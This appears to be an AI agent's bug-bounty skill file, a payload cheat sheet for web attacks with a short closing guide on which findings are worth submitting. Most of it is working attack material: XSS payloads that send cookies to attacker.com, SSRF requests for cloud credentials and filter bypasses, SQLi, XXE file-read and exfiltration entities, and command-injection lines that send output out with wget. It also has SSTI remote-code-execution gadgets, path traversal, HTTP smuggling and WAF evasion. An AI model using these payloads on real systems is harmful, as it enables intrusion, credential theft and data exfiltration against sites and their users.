---
name: security-arsenal
description: Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable.
---

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">
// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>
// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}
// React dangerouslySetInnerHTML reflection
// Vue v-html binding
// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
// Polyglot
'">><marquee><img src=x onerror=confirm(1)></marquee>
```

### DOM XSS Sources and Sinks

**Sources** (user-controlled):
```javascript
location.hash, location.search, location.href, document.referrer, window.name, document.URL
```

**Sinks** (dangerous):
```javascript
innerHTML, outerHTML, document.write, eval, setTimeout (string form), setInterval,
new Function, element.src (javascript: URI), element.href, location.href
```

### WAF Bypass for XSS
```
// Run waf_encoder.py or try these manually:
<svg onload=eval(atob('YWxlcnQoMSk='))>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<img src=x onerror="&#97;lert(1)">
<a href="&#106;avascript:alert(1)">click</a>
<details open ontoggle=alert(1)>
<img src=x onerror=window.onerror=alert;throw+1>
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379     # Redis (unauthenticated)
http://localhost:9200     # Elasticsearch (/_cat/indices)
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker API — GET /containers/json
http://localhost:8080     # Admin panel
http://localhost:10.96.0.1:443  # Kubernetes API
```

### SSRF IP Bypass (11 Techniques)

| Technique | Example | Notes |
|-----------|---------|-------|
| Decimal IP | `http://2130706433` | 127.0.0.1 as decimal |
| Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| Short IP | `http://127.1` | Abbreviated notation |
| IPv6 | `http://[::1]` | Loopback in IPv6 |
| IPv6 mapped | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| DNS rebinding | Attacker DNS → internal IP | First check = external, fetch = internal |
| Redirect chain | External URL → 302 to internal | Check each hop |
| URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency |
| CNAME to internal | Attacker domain → internal hostname | DNS points inward |
| Rare format | `http://[::ffff:0x7f000001]` | Mixed hex IPv6 |

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`)
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL
'; SELECT SLEEP(5)--         -- MySQL
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Fingerprint + Prove Readable Data
```sql
-- MSSQL/MySQL
0' UNION SELECT NULL,@@version,NULL--
-- PostgreSQL
0' UNION SELECT NULL,version(),NULL--
-- Schema walk
0' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES--
```

### Blind SQLi (time-based)
```sql
-- MySQL
' AND SLEEP(5)--
-- PostgreSQL
' AND pg_sleep(5)--
-- MSSQL
'; WAITFOR DELAY '0:0:5'--
-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass for SQLi
```sql
/*!50000 SELECT*/ * FROM users    -- MySQL inline comment
SE/**/LECT * FROM users            -- comment injection
SeLeCt * FrOm uSeRs              -- case variation
%27 OR %271%27=%271               -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                      -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
```

### Blind OOB
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter
;c'a't /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

```
{{7*7}}      → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}       → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>   → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}       → 49 = Mako (Python) or Pebble (Java)
*{7*7}       → 49 = Spring Thymeleaf
{{7*'7'}}    → 7777777 = Jinja2 (not Twig)
```

### RCE by Engine

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
<%= system("id") %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd  # double URL encoding
/etc/passwd%00.jpg                    # null byte truncation
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile
# Change UUID
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...
# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)
# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## JWT ATTACKS

```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt

# RS256→HS256 algorithm confusion
# If server uses RS256 (public key), try signing with HS256 using the PUBLIC key as secret
```

---

## HTTP SMUGGLING PAYLOADS

```http
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.CL
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8

SMUGGLED

0
```

---

## WAF BYPASS REFERENCE

### Soft Block Detection (200 OK ≠ Bypass)

| WAF | Signature |
|-----|-----------|
| Cloudflare JS challenge | `200 OK` + `cf-challenge-form` body |
| F5 BIG-IP | `200 OK` + "The requested URL was rejected" |
| Imperva | `200 OK` + CAPTCHA page + `_Incapsula_Resource` |

**401 and 500 are POSITIVE bypass signals:**
- `401 Unauthorized` = you reached the auth middleware (past WAF edge)
- `500 Internal Server Error` = payload triggered backend exception

### Universal Bypass Techniques
```bash
# Double encoding
%253Cscript%253E

# Unicode
%u003cscript%u003e

# Case variation
<ScRiPt>

# Comments
<scr/**/ipt>

# Null bytes
%00<script>

# HTTP/2 smuggling
# Switch to HTTP/2 in Burp, add Content-Length manually
```

---

## CONDITIONALLY VALID — CHAIN REQUIRED

| Standalone Finding | Chain Required | Valid Result |
|-------------------|----------------|--------------|
| Open redirect | + OAuth redirect_uri | ATO (Critical) |
| Clickjacking | + sensitive action + PoC | Medium |
| CORS wildcard | + credentialed exfil | High |
| CSRF | + sensitive action | High |
| Rate limit bypass | + OTP brute succeeds | Medium/High |
| SSRF DNS-only | + internal data return | Medium |
| Host header injection | + password reset poisoning | High |
| Prompt injection | + reads other user's data | High |
| S3 bucket listing | + JS bundles with secrets | Medium/High |
| Self-XSS | + CSRF to trigger on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri chain | Critical |
| GraphQL introspection | + auth bypass mutation | High |

---

## NEVER SUBMIT LIST

```
Missing CSP / HSTS / security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone
Banner / version disclosure without CVE exploit
Clickjacking on non-sensitive pages
Tabnabbing
CSV injection (no code execution)
CORS wildcard without credentialed exfil
Logout CSRF
Self-XSS
Open redirect alone
OAuth client_secret in mobile app
SSRF DNS callback only
Host header injection alone
Rate limit on non-critical forms
Session not invalidated on logout
Concurrent sessions
Internal IP in error message
Missing HttpOnly / Secure cookie flags alone
```
